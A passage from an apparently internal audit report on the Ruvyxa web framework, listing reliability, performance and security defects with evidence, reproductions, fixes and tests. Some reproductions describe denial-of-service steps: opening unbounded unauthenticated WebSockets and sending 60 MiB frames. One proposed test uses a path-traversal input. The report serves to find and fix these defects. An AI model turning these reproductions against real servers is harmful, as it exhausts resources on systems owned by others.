  `tests/fixtures/framework-endpoint-conformance.json:30`
- **Evidence:** `.route("/__ruvyxa/hmr", get(hmr_ws))` is registered unconditionally, outside the
  `if config.watch` block that gates the devtools routes. The contract records the path as
  `"native": "dev"`. The handler's only gate is an origin check that allows a request with no
  `Origin` and no `Sec-Fetch-Site: cross-site`.
- **Reproduction:** `ruvyxa start`, then `wscat -c ws://127.0.0.1:3000/__ruvyxa/hmr` with no
  `Origin` header. The upgrade succeeds. Repeat N times.
- **Root cause:** `native: "dev"` is honoured three different ways — devtools at _registration_,
  `/__ruvyxa/trace` in the _handler_, and `/__ruvyxa/hmr` **nowhere**. The test that reads the
  contract asserts only that a contract endpoint _is_ registered; nothing asserts a `dev` endpoint
  is _not_ served in production, so the gap is invisible to the gate that exists.
- **Impact:** On a production host any unauthenticated client opens unbounded WebSocket connections
  that are never used, never heartbeated (unlike the two sibling sockets, `hmr_ws` sends no `Ping`,
  so a dead peer is never detected), and never timed out. Each holds a Tokio task, a
  `broadcast::Receiver`, and a socket. Nothing is disclosed — `reload_tx` has no producer when
  `watch` is false — so this is connection/task exhaustion plus a dev surface advertised on a
  deployed build.
- **Fix:** Move the route inside the `if config.watch` block beside the devtools routes.
  `RESERVED_FRAMEWORK_ROUTES` already lists it, so `validate_socket_path` keeps refusing a plugin
  transport there in both modes.
- **Regression risk:** Low — the client-side connector is emitted only into the dev overlay script.
- **Tests:** Extend `every_contract_endpoint_is_registered_on_the_native_router` with a second
  assertion that every `"native": "dev"` endpoint appears after the `if config.watch {` marker or is
  handled by a function whose body contains a `config.watch` guard — the shape the existing
  source-reading tests already use.

### DEVR-02 — This host has no drain window, so `/__ruvyxa/health` can never answer `503`

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/lib.rs:1504-1521`, `:190`;
  `crates/ruvyxa_dev_server/src/framework_endpoints.rs:997-1038`;
  `packages/@ruvyxa/core/src/standalone-server.ts:474-495`
- **Evidence:** `draining.store(true, …)` and `shutdown_tx.send(true)` are adjacent statements, so
  `axum::serve` stops accepting on the same tick the flag is set. The standalone server fixed
  exactly this three commits ago (`2288c19a`) with a `DRAIN_DELAY_MS`, and the fix landed only on
  the JavaScript side. Meanwhile `health_endpoint` documents behaviour this host cannot deliver.
- **Reproduction:** `ruvyxa start`, `SIGTERM`, immediately `curl /__ruvyxa/health`. The probe gets
  `ECONNREFUSED`, never the `503 {"status":"draining"}` body the handler builds.
- **Root cause:** The drain flag and the stop-accepting signal are raised with nothing between them.
  The comment acknowledges that only requests on an already-open connection can observe the draining
  state — but a readiness probe is by definition a fresh connection, and keep-alive is torn down by
  hyper's graceful shutdown too. Additionally `SERVER_SHUTDOWN_GRACE` is a hard-coded 5 s here
  versus a configurable 25 s on the standalone host, so a 6-second in-flight render is cut off on
  one host and completes on the other.
- **Impact:** Anyone running `ruvyxa start` behind a load balancer, a Kubernetes readiness probe, or
  a Docker healthcheck gets failed in-flight requests on every rolling deploy — the exact failure
  the standalone fix names as "it happened on every self-hosted deployment". The `draining` flag,
  the `Retry-After: 1` header, and the whole draining branch are unreachable code on this host.
- **Fix:** In `serve_until_shutdown`, sleep a drain delay between the flag and the signal, read from
  `RUVYXA_DRAIN_DELAY` (default 5 s, `0` disables) and capped at half of `SERVER_SHUTDOWN_GRACE`;
  make the grace read `RUVYXA_SHUTDOWN_GRACE` with the standalone host's 25 s default; honour a
  second signal as an immediate exit.
- **Regression risk:** `ruvyxa dev` would take 5 s to exit on Ctrl-C unless the second-signal escape
  hatch lands alongside and the delay defaults to `0` when `config.watch` is set. Both are cheap;
  not doing them makes the dev loop feel broken.
- **Tests:** A Rust integration test mirroring the standalone drain cases: trip the shutdown and
  assert a _newly connected_ client still gets `503` from `/__ruvyxa/health` before the socket
  closes. The 2026-08-28 drain defect was missed because the equivalent test was skipped on Windows
  — do not gate the new one on platform.

### DEVR-04 — The presence WebSocket buffers up to 64 MiB per message before the 32 KiB frame limit is checked

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/realtime_endpoints.rs:157`, `:206-215`;
  `crates/ruvyxa_dev_server/src/collab.rs:30`, `:306-309`
- **Evidence:** `ws.on_upgrade(...)` is called without `.max_message_size()` / `.max_frame_size()`,
  so tungstenite's defaults apply (64 MiB message, 16 MiB frame). `parse_client_frame` checks
  `payload.len() > MAX_FRAME_BYTES` only _after_ the whole message is in memory, and the
  per-connection `FrameRateLimiter` also runs after materialisation.
- **Reproduction:** Enable a presence transport plugin, connect with no `Origin`, send a single 60
  MiB text frame. The server allocates it, then rejects it. Repeat on N sockets.
- **Root cause:** The 32 KiB bound is enforced by the application protocol parser, not by the
  transport. The module docstring's claim that "a peer can never make the server retain unbounded
  data" is true of retained state and not of the per-message buffer that precedes the check.
- **Impact:** With a presence plugin enabled, an unauthenticated peer forces ~64 MiB of allocation
  per socket per message on the host that also serves the application. `MAX_ROOM_PEERS` and
  `MAX_ROOMS` bound _seated_ peers, not sockets still sending their first frame, so the multiplier
  is concurrent connections rather than the room limits.
- **Fix:** Configure the upgrade before `on_upgrade`:
  `ws.max_message_size(collab::MAX_FRAME_BYTES).max_frame_size(collab::MAX_FRAME_BYTES)`. Derive
  both from `MAX_FRAME_BYTES` so transport and parser bounds cannot drift. Do the same on
  `realtime_ws` and `hmr_ws`, which are write-only so a small bound costs nothing.
- **Regression risk:** A peer sending between 32 KiB and 64 MiB currently gets a JSON `error` frame
  and keeps its connection; with a transport limit the connection is dropped instead. That is the
  correct answer but is a behaviour change for the parser's oversize branch, whose test exercises
  the parser directly and stays green.
- **Correction (2026-08-29, from implementing this):** the close code named here was wrong. The
  version of tungstenite this depends on returns `Error::Capacity` and axum drops the connection
  with **no close handshake** — there is no `1009 Message Too Big` frame. The defence is identical
  (nothing over the limit is ever allocated); only the wire courtesy differs.
- **Tests:** A test driving a real upgrade and asserting a 33 KiB text frame is refused by the
  transport rather than read.

### DEVR-05 — `.env` / `.env.local` silently override the real process environment for every child process

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/env_file.rs:10-30`;
  `crates/ruvyxa_dev_server/src/worker_pool.rs:387`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:2227`, `:2232`
- **Evidence:** `project_env` builds a map from the two files and nothing else; `Command::envs`
  _merges into and overrides_ the inherited environment. There is no `env_clear()` and no "skip keys
  already present in `std::env`" filter anywhere in the chain.
- **Reproduction:** With `.env` containing `DATABASE_URL=replace-me-at-deploy` — literally what
  `docs/en/07-configuration.md:288` tells readers to write — run
  `DATABASE_URL=postgres://real ruvyxa start`. Every render worker receives the placeholder.
- **Root cause:** `project_env` implements "file wins". Every dotenv implementation this is modelled
  on — `dotenv`, `dotenvx`, Node's `--env-file`, Vite, Next.js — implements the opposite. Nothing in
  the repo states which rule Ruvyxa intends; the env fixture governs _which names are public_, not
  _which source wins_.
- **Impact:** A `.env` committed with placeholders — the documented workflow — silently shadows
  platform-injected secrets on a self-hosted `ruvyxa start` deployment, so production runs with
  development credentials while the operator can see the correct value in `env`. `.env.local`, which
  is conventionally git-ignored, outranks `.env` and therefore also the real environment. The same
  map feeds `build_dependency_hash` and the artifact cache key, so the wrong value is baked into
  cached compilation output too.
- **Fix:** Skip a key that `std::env::var_os` already answers, restoring conventional precedence. If
  file-wins is deliberate, say so in the docstring and in the configuration docs and make the choice
  fixture-held so the JS half agrees.
- **Regression risk:** A developer relying on `.env` beating a shell-exported variable sees the
  shell win instead. That is conventional, but it is a change and belongs in the changelog.
- **Tests:** Set a process variable, write a `.env` naming the same key, assert which one
  `project_env` returns. Nothing pins this in either direction today.

### DEVR-06 — The locale redirect drops the request's query string, on both hosts

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/i18n.rs:154-160`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:245-259`;
  `packages/ruvyxa/runtime/serverless-handler.mjs:1587-1608`
- **Evidence:** `prefixed_path` builds the `Location` from the path alone, and `request_path` is
  `canonical_request_path(parts.uri.path())`, which by construction excludes the query.
  `request_target` — the value that does carry it — is never passed to `locale_redirect_path`. The
  deployed half builds `candidate` from `pathname` alone and `Response.redirect(new URL(...))` does
  not re-attach the query.
- **Reproduction:** With `i18n` configured and a `/[lang]/search` page, `GET /search?q=hello`
  answers `307 Location: /en/search`.
- **Root cause:** The function was written to answer "which prefixed path does this URL belong at"
  and its signature only ever received the path. A 307 preserves method and body but says nothing
  about the query — the query is part of the target URI and must be reproduced explicitly.
- **Impact:** Every query-bearing entry point on an i18n site loses its parameters on the first,
  unprefixed hit: search, pagination, UTM attribution, OAuth `?code=`/`?state=` callbacks landing on
  an unprefixed path, and any deep link shared without the locale prefix.
- **Fix:** Give `locale_redirect_path` the query (pass `request_target` and split it, or add a
  `query: Option<&str>` parameter) and append it to the returned candidate. Add query cases to
  `tests/fixtures/i18n-routing-conformance.json` first, then fix both replays.
- **Regression risk:** Very low. A redirect that carries the query is strictly more correct, and
  routing ignores the query so no route can be shadowed by it.
- **Tests:** New fixture cases with a `query` field, replayed by
  `locale_redirects_match_the_shared_conformance_table` and by
  `tests/packages/ruvyxa/serverless-handler.test.mjs`.

## Render workers, pipeline, cache, watcher

### DEVC-03 — The file watcher has no debounce, so one editor save runs the whole invalidation and spawns several worker generations

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/watcher.rs:76`, `:99`, `:197`, `:212-213`;
  `crates/ruvyxa_dev_server/src/worker_pool.rs:1201`, `:1207-1220`
- **Evidence:** The callback is registered on the raw `notify` watcher — a repo-wide grep for
  `debounce`/`new_debouncer` matches nothing outside a bundler test fixture. Every accepted event
  runs the full pipeline including `render_cache.invalidate_all_blocking()`, and an instrumentation
  file additionally triggers `recycle()`, which spawns one fresh child per pool slot before
  swapping.
- **Reproduction:** `ruvyxa dev`, save `instrumentation.ts` once from VS Code, count `node`
  processes. Windows `ReadDirectoryChangesW` reports one write as multiple `Modify` events, and
  atomic-save editors emit a rename pair as well, so the callback fires 2–3 times per Ctrl-S.
- **Root cause:** Raw OS events. Every downstream consumer is idempotent in _effect_ but not in
  _cost_, and `recycle()` is not idempotent in cost at all: two overlapping calls each read
  `workers.len()`, each spawn that many processes, and each retire the generation the other just
  installed — three generations started and two retired for one save, with the retired ones sitting
  in `retiring` for up to 60 s.
- **Impact:** Dev-mode only, but it is the hot path a developer feels: a full render-cache flush, an
  NDJSON invalidation broadcast to every worker, an extra HMR frame, and — for instrumentation edits
  — several hundred milliseconds of Node startup per redundant generation plus 2–3× the pool's
  transient memory. Redundant HMR frames also make the edit-trace store record several traces for
  one logical edit, which is what the DevTools timeline shows.
- **Fix:** Coalesce events before acting — `notify-debouncer-full` with a ~50–100 ms window, or a
  channel drained by a task that batches everything in a short window into one `HmrUpdate`.
  Independently, guard `recycle()` with an `AtomicBool`/`Mutex` so a second call joins the first.
- **Regression risk:** A debounce window adds latency to every HMR update, and batching changes
  which paths appear together — a batch spanning a CSS file and a `.tsx` file would classify as
  `ComponentUpdate` rather than `CssUpdate`, losing a hot style swap. Keep the window short and
  classify per batch exactly as `hmr_update_kind` already does.
- **Tests:** Feed the coalescer three synthetic events for one path inside the window and assert one
  `HmrUpdate`. Call `recycle()` twice concurrently and assert one new generation.

### DEVC-04 — Concurrent requests for one cold page each render it, because pool load-balancing defeats the worker's own coalescing

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/render_pipeline.rs:730`, `:843`, `:868-870`, `:1183`,
  `:1266`, `:1437`; `crates/ruvyxa_dev_server/src/worker_pool.rs:1276-1287`
- **Evidence:** Every cacheable strategy is a plain check-then-render-then-store with no claim
  between the miss and the store. ISR's _background_ revalidation is coalesced by
  `IsrRevalidationSlot::claim`, but its cold path is not, and SSG/CSR/PPR/SSR have no equivalent.
  The worker does coalesce identical renders per process — but `select_worker` returns the first
  idle worker, so the racing requests are deliberately routed apart and coalescing never sees them
  together.
- **Reproduction:** `ruvyxa start` with a cold render cache and an SSG route taking ~1 s; issue 8
  concurrent `GET`s for that URL and count distinct renders. Expect up to `pool_size`.
- **Root cause:** Single-flight is implemented in the wrong process. The only place that knows the
  cache key is the Rust host; the only place that coalesces is a worker that sees at most one of the
  racing requests.
- **Impact:** On a cold or just-invalidated cache — every `revalidatePath()`, every deploy, every
  process restart, every dev-mode save — a burst of N concurrent requests for one URL costs N full
  renders. That is the thundering-herd amplifier that turns a normal traffic spike into the overload
  condition RUV-H15 then converts into worker kills. Correctness is unaffected.
- **Fix:** Generalise `IsrRevalidationSlot` into a keyed single-flight that _waits_ rather than
  skips: a `Mutex<HashMap<String, broadcast::Sender<CachedDocument>>>` on `AppState`, claimed by
  cache key in `render_page_ssg`, `render_page_csr`, `render_page_ppr`, the ISR cold path, and the
  cacheable branch of `render_page_pooled`. Losers subscribe and receive the winner's document.
- **Regression risk:** A waiter must not inherit the winner's failure indefinitely — on error the
  claim has to be released and each waiter falls back to rendering itself, or one broken render
  stalls every concurrent request for that URL. The claim must also be released on drop, exactly as
  `IsrRevalidationSlot` already does.
- **Tests:** A multi-thread test firing N concurrent renders of one key against a counting stub,
  asserting the render count is 1 and all N callers received the same `Arc`; plus a test that a
  failing render releases the claim.

### DEVC-05 — Every watcher event canonicalizes the project root once per path, on the single notify thread

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/watcher.rs:81`, `:429`, `:479`, `:105`;
  `crates/ruvyxa_dev_server/src/hmr_tracker.rs:391`; `crates/ruvyxa_diagnostics/src/lib.rs:347-352`
- **Evidence:** The ignore filter is applied per path and canonicalizes the root _inside_ the
  per-path call; `instrumentation_source_changed` does it again plus one `canonicalize` per path's
  parent; and `normalized_canonical_path` is a real syscall every time, with no memoisation. The
  same function backs `HmrTracker::normalize_source_path`, so `populate_from_manifest` canonicalizes
  every route file, layout, server module and client module — inline on a Tokio worker thread, not
  under `spawn_blocking`.
- **Reproduction:** Run `ruvyxa dev` and then `pnpm install` inside the project root. `node_modules`
  is recursively watched (the only watch root is `config.root`) and filtered _after_ the per-path
  `canonicalize`, so tens of thousands of events each pay a syscall on the one notify thread before
  being discarded.
- **Root cause:** The cheap ignore test sits behind the expensive normalisation, and the
  normalisation is of a value that never changes for the life of the server.
- **Impact:** During any bulk filesystem activity inside the project — `pnpm install`,
  `git checkout`, a build output directory not on the ignore list — the watcher thread falls behind
  and HMR updates are delayed by an unbounded amount; the developer sees saves that appear not to
  take. Windows `canonicalize` is the more expensive of the two platforms. Combined with DEVC-03, a
  storm is amplified rather than absorbed.
- **Fix:** Canonicalize the root **once** in `start_watcher` and move it into the closure, passing
  the canonical form down. Reorder `ignored_watch_path` to test cheap component names
  (`node_modules`, `.git`, `target`) against the raw path first. Additionally, do not recursively
  watch known ignored top-level directories.
- **Regression risk:** Precomputing the canonical root changes behaviour if the root is moved or its
  symlink retargeted while the server runs — which already cannot work, since the watch handle is
  bound to the original inode. Narrowing the watch roots risks missing a file the recursive watch
  happens to cover; verify against `watches_the_project_root_for_imported_modules_and_styles`, which
  pins that a sibling `styles/` directory outside `app/` must still be watched.
- **Tests:** Assert `ignored_watch_path` rejects a `node_modules` path without touching the
  filesystem — e.g. by passing a root that does not exist.

## Static assets, documents, CSS, images

### ASSET-01 — A whole-file streamed asset declares `Content-Length` from stale metadata and then streams unbounded

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/static_assets.rs:318`, `:486-515`
- **Evidence:** `metadata` is read at `:318`, before the file is opened at `:479`. The range branch
  bounds the reader with `handle.take(range.len())`; the whole-file branch is
  `ReaderStream::new(handle)` with no bound at all, while `Content-Length` comes from the earlier
  `Metadata`.
- **Reproduction:** Request a `public/` file larger than the 8 MiB streaming threshold and grow or
  truncate it between the `metadata` and `open` calls — an in-progress `cp`/`rsync` of a large asset
  into `public/` is the natural case.
- **Root cause:** `Content-Length` is a claim about a different observation of the file than the one
  the body streams from. This is not the `Range` slicing path, which is correct — it is the no-range
  path, which is the common one.
- **Impact:** A body longer than `Content-Length` makes hyper truncate and error the connection; a
  shorter one is an incomplete message. In both cases a keep-alive connection is poisoned rather
  than one request failing, and the client sees a corrupt download of exactly the kind of file this
  streaming path was added for.
- **Fix:** Bound the whole-file branch the same way: `ReaderStream::new(handle.take(full_length))`.
  For the shrink direction, re-`stat` the open handle and use that length for both `Content-Length`
  and the `take`, so the advertised length and the streamed bytes come from one observation of one
  descriptor.
- **Regression risk:** Low. `handle.take(n)` yields at most `n` bytes and stops at EOF. Re-`stat`ing
  adds one syscall per streamed asset; the `take` alone is already a strict improvement.
- **Tests:** Beside `a_large_public_asset_is_streamed_rather_than_buffered`: write a file above the
  threshold, call `serve_public_file`, append to the file before draining the body, and assert the
  delivered length equals the header. A shrink variant asserts the same invariant.

### ASSET-02 — Every 404 whose message is not literally "Route not found" renders a "500" page

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/html_document.rs:849-857`;
  `crates/ruvyxa_dev_server/src/render_pipeline.rs:267-272`, `:374-381`
- **Evidence:** `plain_error_page` infers the status from the message —
  `let not_found = message.contains("Route not found")` — while two call sites pass
  `error_page("Asset not found", …)` under a `StatusCode::NOT_FOUND`.
- **Reproduction:** A project with a dynamic route such as `app/[lang]/page.tsx`, run
  `ruvyxa start`, request `/missing.png`. The status is 404; the body says
  `<title>Ruvyxa Error - 500</title>`, renders a large `500`, and reads "Ruvyxa hit an unexpected
  error."
- **Root cause:** A stringly-typed coupling between a caller's wording and a rendered status code.
  It has already broken: both `error_page("Asset not found", …)` sites were written after the
  sniffing rule and neither uses the magic phrase.
- **Impact:** Every production `ruvyxa start` that hits a missing-asset path shows visitors a 500
  page for a 404 response. It misdirects operators reading a bug report and makes the page's own
  `<title>` disagree with the status line, which some monitoring and crawler tooling reads.
- **Fix:** `plain_error_page(status: StatusCode, message: &str)`, deriving code and title from
  `status.as_u16()` / `status.is_client_error()`, dropping the `contains` sniff. Thread the status
  through `error_page` from its three call sites, which already hold it one line above.
- **Regression risk:** Low and confined to two files. `error_response` already has the status in
  hand. The existing `plain_error_page_uses_centered_404_state_and_logo` test needs its call
  updated.
- **Tests:** Assert the rendered page's code matches the status for both `NOT_FOUND` and
  `INTERNAL_SERVER_ERROR`, driven by the status rather than the message, plus a case using the
  literal message `"Asset not found"` — the wording that shipped the defect.

### ASSET-03 — `document_head_defaults` lowercases the whole document and scans it eight times, per SSR render

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/static_assets.rs:950-962`, `:972-979`;
  `crates/ruvyxa_dev_server/src/html_document.rs:183-204`
- **Evidence:** `let lower = document.to_ascii_lowercase()` — a full copy of the page — followed by
  eight `lower.contains(...)` calls, three of which build a `String` per call via `format!`. The
  crate states the rule this violates one module over: `find_ascii_case` exists precisely so
  `compose_document` does not allocate a lowercased copy of the page per call.
- **Reproduction:** `document_head_defaults` is called with the complete SSR document on every
  buffered page render (five call sites), and `prerender.rs:1185` calls it and then lowercases the
  same document a second time at `:1189`.
- **Root cause:** The function predates `find_ascii_case`/`contains_ascii_case` and was never
  converted.
- **Impact:** Per server-rendered page: one heap allocation the size of the document, one full
  memcpy with case folding, and eight full passes — on the request path, for a question answered by
  two short needles. On a 200 KB page that is ~200 KB allocated and ~1.6 MB scanned per response,
  and the prerender writer pays it twice per page across the whole build.
- **Fix:** Replace with `contains_ascii_case(document, …)` and rewrite `declares_own_icon` to take
  `&str` and use the same against six constant needles, removing the three `format!` allocations.
- **Regression risk:** Low. `find_ascii_case` folds ASCII byte-for-byte, which is what
  `to_ascii_lowercase` + `contains` does for these ASCII-only needles, and the behaviour is already
  pinned by `tests/fixtures/document-head-conformance.json`.
- **Tests:** The existing conformance replay covers correctness. Add a fixture case with upper-case
  `REL="ICON"` and one with `NAME='VIEWPORT'` so case-insensitivity is stated by the shared table.

### ASSET-04 — The on-demand image cache re-reads and re-hashes the whole source file on every hit, on the async task

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/dynamic_image.rs:181-200`
- **Evidence:** Every request reads the file (up to `MAX_SOURCE_BYTES` = 20 MiB) and blake3-hashes
  it to _derive the cache key_, then consults the cache. The `spawn_blocking` at `:202` starts after
  the hash.
- **Reproduction:** Enable `image.onDemand`, put a large source in `public/`, and request the same
  `/__ruvyxa/image?src=…&w=…&q=…` repeatedly. Every hit still reads 20 MiB and hashes it.
- **Root cause:** The key is derived from the file's _contents_, so the contents must be
  materialised before the cache can be consulted. The crate already solved this for static assets in
  the same request path — `AssetIdentity` + `is_settled` key on `(len, mtime)` with a settle window
  and fall back to hashing — and the pattern was not applied here.
- **Impact:** The cache saves the encode and nothing else: peak per-request I/O and CPU stay
  proportional to the source size no matter how warm the cache is, and each request pins a runtime
  worker thread for the whole hash. It also gives an unauthenticated caller a cheap way to make the
  server do bounded but repeated large reads.
- **Fix:** Key on `(normalized_canonical_path, len, mtime, width, quality)` when the mtime has
  settled — reuse `static_assets::is_settled`'s two-second rule — falling back to reading and
  content-hashing when it has not. Move the fallback hash inside the existing `spawn_blocking`.
- **Regression risk:** The metadata key must not serve stale bytes; that is what the settle window
  exists for, and the same argument is already written out in `static_assets.rs`. Keep the content
  hash as the fallback.
- **Tests:** Extend `resizes_public_images_and_reuses_the_bounded_cache` to assert a second
  identical request does not re-read the file, and add a case rewriting the source to different
  bytes of the _same_ length asserting the returned image changes.

### ASSET-05 — A production build silently falls back to the dev on-demand compile endpoint when the client manifest cannot be read

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_dev_server/src/html_document.rs:465-533`, `:285-332`
- **Evidence:** `load_client_manifest` uses `.ok()?` for three distinguishable failures (file
  absent, unreadable, invalid JSON), and the caller's `unwrap_or_else` then points the document at
  `/__ruvyxa/client?path=…` — identically in both `watch` branches.
- **Reproduction:** `ruvyxa build`, then truncate or corrupt `<client_dir>/manifest.json` (a
  half-written file from an interrupted build, or a route whose `path` key does not match), and run
  `ruvyxa start`. The served document carries the on-demand compile endpoint instead of the built,
  content-addressed bundle, and nothing is logged.
- **Root cause:** Three fail-soft returns whose empty answer is indistinguishable from "this route
  has no client bundle", which is a legal state.
- **Impact:** A production page loads a second, separately-compiled React through the dev endpoint —
  the exact duplication whose symptom (`every hook in it threw`, silent fallback to document loads)
  the crate already paid for once and documents at `framework_endpoints.rs:134-140`. Invisible: the
  page still renders server-side and returns 200, and the only evidence is a bundle URL in the HTML.
- **Fix:** Make `load_client_manifest` distinguish "no manifest file" from "manifest present but
  unreadable or invalid", and `tracing::error!` the parse error with the path. In
  `client_hydration_script`, take the `/__ruvyxa/client?path=…` fallback only when `config.watch` is
  true; when it is false and no prebuilt asset was found, emit no script tag and log once — the same
  outcome the RSC path already chooses, and it does not load a second React.
- **Regression risk:** A route legitimately absent from the manifest stops getting a bundle under
  `start`. That is the intended change but should be verified against `examples/deploy-smoke` and
  `examples/demo` before landing. `ruvyxa dev` behaviour is unchanged.
- **Tests:** `client_hydration_script` with `watch: false` and (a) a missing `manifest.json`, (b)
  one containing invalid JSON — assert neither emits `/__ruvyxa/client?path=`.

## CLI build, prerender, artifact cache

### CLIB-02 — The build report `client/manifest.json`, which carries absolute source paths, is published at a public URL by every host

- **Category:** Security · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/build.rs:997`; `crates/ruvyxa_cli/src/client_bundle.rs:1474`,
  `:1448`, `:820`; `packages/ruvyxa/runtime/adapter-runner.mjs:1762`
- **Evidence:** The file's own sibling documents the rule it breaks: "`manifest.json` is a build
  report: it carries absolute source paths … the absolute paths of which should never be shipped to
  clients." It is written straight into the published `client/` directory. `resolve_client_file`
  maps any flat file name under `/__ruvyxa/client/` into that directory, and
  `adapter-runner.mjs:1762` copies the whole tree into the publish root with **no** exclusion set —
  while the two calls on either side of it exclude exactly this class of file.
- **Reproduction:** `ruvyxa build --root examples/demo`, then `ruvyxa start` and
  `GET /__ruvyxa/client/manifest.json`; or deploy through any adapter using `stageStaticOutput` and
  fetch the same path.
- **Root cause:** Two files with the same base name serve two audiences from one directory. The lean
  browser-facing `route-manifest.json` was added to stop shipping the build report, and the build
  report was left beside it in a directory that is by contract entirely public.
- **Impact:** Any visitor to a deployed site can read the absolute filesystem layout of the build
  machine (on a developer machine, the OS account name; on CI, the runner's workspace path), the
  complete module graph of every shared chunk and route, the bundler cache location, the configured
  plugin list, and per-route byte counts. No direct exploit — reconnaissance the project has
  explicitly decided not to publish, published on every deployment.
- **Fix:** Write the build report to the staging root as `client-report.json` instead of into
  `client_dir`, and update its two readers (`prerender.rs:1212`, `adapter-runner.mjs:977`). The
  minimum alternative — adding `manifest.json` to the copy's exclusion set **and** refusing it in
  `resolve_client_file` — leaves two hosts to keep in step, which is the shape this repo has been
  burned by.
- **Regression risk:** `adapter-runner.mjs:977` reads it from the _build_ directory, not the publish
  directory, so moving the file requires updating one join. A third-party adapter reading
  `client/manifest.json` would break — worth a release note.
- **Tests:** Assert no file emitted into `client_dir` contains the project root's absolute path, and
  an adapter static-output case asserting the publish directory has no
  `__ruvyxa/client/manifest.json`.

### CLIB-03 — The output audit compares percent-encoded URLs against raw file names, failing a correct build

- **Category:** Reliability · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/output_audit.rs:136`, `:158`, `:173`;
  `crates/ruvyxa_cli/src/build.rs:1146`
- **Evidence:** `document_asset_urls` strips only a query or fragment, and the audit then joins the
  URL onto a directory with filesystem semantics. Every host that actually serves the URL decodes it
  first (`canonical_request_path`, `decodeURIComponent`). The failure is fatal, not a warning.
- **Reproduction:** `public/my photo.png` referenced as `<img src="/my%20photo.png" />` — the
  correct HTML spelling. The audit looks for a file literally named `my%20photo.png`, finds none,
  and the build fails with `RUV1213`, even though every host serves the image.
- **Root cause:** A fourth implementation of "which file does this URL name", and unlike the other
  three it skips the decode step.
- **Impact:** A project with a space or a non-ASCII character in any `public/` file name, referenced
  in its encoded form, cannot build at all. There is no flag to skip the audit; the only workaround
  is renaming the asset.
- **Fix:** Percent-decode each URL before joining, using the same decode-and-reject rules
  `canonical_request_path` applies, and treat an undecodable URL as "not this audit's to resolve"
  rather than as dangling. Better, extract that decision into `ruvyxa_dev_server` so this is not a
  fourth copy.
- **Regression risk:** Decoding widens what the audit resolves, so a decoded `..` must not escape
  `assets_dir` — the reject list has to come with the decode. Existing tests use unencoded URLs and
  stay green.
- **Tests:** A document referencing `/my%20photo.png` against an emitted `assets/my photo.png`
  reports nothing; a document referencing `/%2e%2e/secret.png` is not resolved outside `assets_dir`.

### CLIB-04 — Every cached prerender artifact is read and JSON-parsed twice, on exactly the build the cache exists to speed up

- **Category:** Performance · **Confidence:** CONFIRMED
- **Files:** `crates/ruvyxa_cli/src/prerender.rs:319`, `:565`;
  `crates/ruvyxa_cli/src/artifact_cache.rs:231-250`
- **Evidence:** The pre-scan that decides whether to start a Node process calls
  `load_prerender_artifact(&artifact_cache, job)` and throws the answer away; the render then calls
  it again. `load_prerender_artifact` reads the whole cache file and deserializes a struct whose
  `html: String` field is the entire rendered document.
- **Reproduction:** Build a project with many SSG pages twice and profile the second, fully warm
  run.
- **Root cause:** The pre-scan answers its question by doing the full work. Note the asymmetry:
  `.any()` short-circuits on the _first miss_, so a cold build pays for one extra load and a fully
  warm build pays for `N` — the cost lands entirely on the case the pre-scan was added to optimise.
- **Impact:** A warm build of a large static site doubles its prerender-phase disk reads and JSON
  parsing. On a site with thousands of expanded dynamic paths this is the dominant cost of a build
  that is otherwise supposed to do nothing.
- **Fix:** Drop the pre-scan and start the pool lazily: hold it behind a
  `tokio::sync::OnceCell<Arc<NodeWorkerPool>>` shared by the spawned render tasks and initialise on
  the first cache miss. That removes the second read entirely and preserves the "no Node process on
  a fully cached build" property.
- **Regression risk:** The lazily started pool must be started under the `OnceCell` so `parallelism`
  concurrent misses do not start `parallelism` pools, and the `shutdown()` must reach whatever the
  cell ended up holding.
- **Tests:** Extend `prerender_artifact_cache_reuses_and_invalidates_dependency_content` with a
  read-count assertion proving a warm build loads each artifact once.
- **Correction (2026-08-30, from implementing this):** the root cause and the fix are both right and
  already shipped — `LazyPrerenderWorkerPool` (a `tokio::sync::OnceCell`) replaced the pre-scan, and
  `PRERENDER_ARTIFACT_READS` gates "each artifact is read once" from a dedicated test rather than
  from the cache test this entry named. **The Impact paragraph is wrong, and by roughly three orders
  of magnitude.** Measured on `examples/demo` (20 cached artifacts, 108 KB, mean 5.4 KB), warm
  build, debug profile, seven samples each, using the build's own `timing.prerenderMs`: the
  pre-render phase is **79.0 ms median with the fix and 77.3 ms median with the pre-scan restored**
  — the duplicate is not merely small, it is inside run-to-run noise (±4 ms on the phase, ±60 ms on
  a ~630 ms build), so a direct A/B on the repo's own fixture cannot see it at all. Isolating the
  unit cost by running the pre-scan 50× per build raises the phase to 211.7 ms median, i.e. **1,000
  extra artifact loads cost ≈133 ms, or ≈0.13 ms per 5 KB artifact**; one real pre-scan of
  `examples/demo` is therefore ≈2.7 ms, 0.4% of the build. It takes on the order of **5,000 static
  paths before the duplicated read reaches one second**, in a debug binary — a release binary is
  faster still. The change is worth keeping (the second read is pure waste, and the cell also
  deletes the eager-start branch and gives `shutdown()` a single owner, which is `CLIB-05`'s
  concern), but it should be understood as a structural cleanup, not a build-time win: nobody should
  expect a measurable regression if it is reverted, and no future finding should cite this one as
  evidence that the pre-render phase was read-bound.
- **Second correction, same date — the gate had a hole, now closed.** `PRERENDER_ARTIFACT_READS`
